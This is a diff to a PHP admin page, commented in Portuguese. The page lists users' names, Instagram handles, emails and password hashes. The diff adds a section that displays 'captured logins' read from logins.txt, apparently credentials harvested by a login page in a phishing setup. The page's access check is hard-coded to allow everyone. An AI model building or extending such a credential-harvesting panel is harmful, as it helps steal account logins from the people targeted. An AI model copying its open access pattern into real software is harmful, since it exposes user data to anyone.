@@ -2,14 +2,15 @@
 require 'db.php';
 session_start();
 
-// Verificação simples para restringir o acesso (você pode trocar por uma verificação mais segura depois)
-$acesso_liberado = true; // Mude para false para testar proteção
+// Verificação simples para acesso (pode trocar por verificação por sessão depois)
+$acesso_liberado = true; // Coloque false para bloquear
 
 if (!$acesso_liberado) {
     echo "Acesso negado.";
     exit();
 }
 
+// Pega os usuários do banco de dados
 $stmt = $pdo->query("SELECT nome, instagram, email, senha_hash, data_criacao FROM usuarios");
 $usuarios = $stmt->fetchAll(PDO::FETCH_ASSOC);
 ?>
@@ -42,6 +43,20 @@ $usuarios = $stmt->fetchAll(PDO::FETCH_ASSOC);
             </tr>
             <?php endforeach; ?>
         </table>
+
+        <hr><br>
+        <h2 style="color:#fff;">📂 Logins Capturados no login.php</h2>
+        <pre style="background: #111; color: #0f0; padding: 10px; border-radius: 10px;">
+<?php
+$logins = 'logins.txt';
+if (file_exists($logins)) {
+    echo htmlspecialchars(file_get_contents($logins));
+} else {
+    echo "Arquivo logins.txt não encontrado.";
+}
+?>
+        </pre>
+
         <br><a href="dashboard.php" class="btn-voltar">🔙 Voltar</a>
     </div>
 </body>
